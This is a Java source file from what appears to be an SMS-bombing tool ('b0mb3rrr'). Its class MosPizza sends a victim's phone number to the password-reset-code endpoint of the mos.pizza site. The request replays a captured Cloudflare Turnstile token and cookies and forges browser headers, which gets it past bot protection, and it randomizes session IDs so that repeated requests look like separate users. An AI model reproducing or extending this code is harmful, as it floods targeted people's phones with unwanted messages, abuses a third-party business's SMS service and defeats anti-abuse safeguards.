package me.oneqxz.b0mb3rrr.services.impl;

import me.oneqxz.b0mb3rrr.data.Phone;
import me.oneqxz.b0mb3rrr.services.Service;
import okhttp3.FormBody;
import okhttp3.Request;

import java.util.UUID;

public class MosPizza extends Service {
    @Override
    public Request.Builder buildRequest(Phone phone) {
        return new Request.Builder()
                .url("https://mos.pizza/api/v2/auth/resetCode")
                .post(new FormBody.Builder()
                        .add("phone", phone.phone())
                        .add("cf-turnstile-response", "0.kAuPqkTfb_UtBoS4w-H25auB0GPJEOWJFuMeOLkBqeWWrB6UMW5lR4N5cGMj7fWa91FAF3WbTIzgy5pQwDGLnfKM36y-jz3lJOUKSLQfj2cL_1z7Go4mCcdvNWnthrt9WanA-_YNPnq_g011nefqxpvIB4NryZIUAFwhpaFYJzUKZVLO6gSrRm5qSR2a-SfpkwnXe9Ui9Z_R11rCrKQAmqwHH66EEr2wDVuQtXm-HjnmCDi7PMHSKfvyWO_ZOeyrKci7xnoNlzZPGFlFdzoUCsOrgf4WDlBF8ERAnooH_XLc-RuceIuv4n3GKaD4fwQXKerGhR41OGxQBrXquAf2O-lFR8qVr7FHgKW2Kn1G47JFjltYuNQpdzoppOAiZzyTdsaETOL1AomsuqE2zL8SNe11UESjYGjUaaBvc34hPNI.s80t9C17nTEGnChslOqtEA.95320ab8c6c992e94aecaea1c6a32a9f89ea5aa782b34b3396bb043c155c0055")
                        .build())
                .header("accept", "application/json")
                .header("accept-language", "en-US,en;q=0.9,ru;q=0.8")
                .header("authcode", "")
                .header("content-type", "application/json")
                .header("cookie", "NEXT_LOCALE=ru; sessionId=60e50ec3-ffde-447d-ae66-de4cd0cb8e72; _ym_uid=1712657330296908487; _ym_d=1712657330; _ga=GA1.1.1914380346.1712657330; _ga_TV6DVD4YPY=GS1.1.1712657329.1.0.1712657329.0.0.0; _ym_isad=2; _ym_visorc=w; challengeToken=0.kAuPqkTfb_UtBoS4w-H25auB0GPJEOWJFuMeOLkBqeWWrB6UMW5lR4N5cGMj7fWa91FAF3WbTIzgy5pQwDGLnfKM36y-jz3lJOUKSLQfj2cL_1z7Go4mCcdvNWnthrt9WanA-_YNPnq_g011nefqxpvIB4NryZIUAFwhpaFYJzUKZVLO6gSrRm5qSR2a-SfpkwnXe9Ui9Z_R11rCrKQAmqwHH66EEr2wDVuQtXm-HjnmCDi7PMHSKfvyWO_ZOeyrKci7xnoNlzZPGFlFdzoUCsOrgf4WDlBF8ERAnooH_XLc-RuceIuv4n3GKaD4fwQXKerGhR41OGxQBrXquAf2O-lFR8qVr7FHgKW2Kn1G47JFjltYuNQpdzoppOAiZzyTdsaETOL1AomsuqE2zL8SNe11UESjYGjUaaBvc34hPNI.s80t9C17nTEGnChslOqtEA.95320ab8c6c992e94aecaea1c6a32a9f89ea5aa782b34b3396bb043c155c0055")
                .header("lang", "ru")
                .header("origin", "https://mos.pizza")
                .header("referer", "https://mos.pizza/")
                .header("sec-ch-ua", "\"Google Chrome\";v=\"123\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"")
                .header("sec-ch-ua-mobile", "?0")
                .header("sec-ch-ua-platform", "\"Linux\"")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("sessionid", UUID.randomUUID().toString())
                .header("timezone", this.getFaker().address().timeZone())
                .header("uber-trace-id", "51c1749cb0ed62acbf063fafad3dfc7d:9caba1ea18ec0e4a:0:1");
    }

    @Override
    public String getServiceName() {
        return "MosPizza";
    }
}
